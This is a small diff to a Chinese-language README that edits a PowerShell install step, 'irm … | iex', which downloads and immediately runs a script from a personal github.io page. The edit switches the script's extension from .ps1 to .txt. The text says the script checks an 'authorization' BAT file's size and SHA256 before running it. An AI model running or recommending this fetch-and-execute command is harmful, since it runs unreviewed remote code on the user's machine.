@@ -5,7 +5,7 @@
 在 Windows PowerShell 中运行：
 
 ```powershell
-irm https://sragbangala-boop.github.io/i.ps1|iex
+irm https://sragbangala-boop.github.io/i.txt|iex
 ```
 
 启动脚本会校验授权 BAT 的固定大小和 SHA256，校验通过后才运行。
